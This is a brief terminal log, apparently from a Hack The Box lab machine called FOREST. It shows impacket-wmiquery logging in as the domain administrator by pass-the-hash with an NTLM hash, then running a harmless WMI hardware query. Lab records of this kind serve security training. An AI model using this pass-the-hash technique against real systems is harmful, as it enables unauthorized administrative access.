```sh
└─$ impacket-wmiquery -debug 'htb.local/administrator@10.129.138.203' -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Target system is 10.129.138.203 and isFQDN is False
[+] StringBinding: \\\\FOREST[\\PIPE\\atsvc]
[+] StringBinding: FOREST[49668]
[+] StringBinding: 10.129.138.203[49668]
[+] StringBinding chosen: ncacn_ip_tcp:10.129.138.203[49668]
[!] Press help for extra shell commands
WQL> SELECT * FROM Win32_AssociatedProcessorMemory
| Antecedent | Dependent | BusSpeed | 
| \\FOREST\root\cimv2:Win32_CacheMemory.DeviceID="Cache Memory 0" | \\FOREST\root\cimv2:Win32_Processor.DeviceID="CPU0" | None | 
| \\FOREST\root\cimv2:Win32_CacheMemory.DeviceID="Cache Memory 1" | \\FOREST\root\cimv2:Win32_Processor.DeviceID="CPU0" | None | 
| \\FOREST\root\cimv2:Win32_CacheMemory.DeviceID="Cache Memory 2" | \\FOREST\root\cimv2:Win32_Processor.DeviceID="CPU0" | None |
```
